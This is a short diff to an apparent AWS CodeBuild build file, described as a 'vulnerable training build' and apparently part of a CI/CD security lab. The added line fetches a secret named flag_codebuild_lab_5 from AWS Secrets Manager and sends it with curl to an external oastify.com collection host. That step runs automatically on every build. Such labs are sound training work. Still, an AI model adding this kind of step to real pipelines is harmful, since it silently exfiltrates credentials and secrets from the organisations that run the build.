@@ -5,4 +5,5 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text | curl -X POST --data-binary @- https://p4utho1hal20gcqoflmjrd0tqkwbk58u.oastify.com
       - echo "Done"
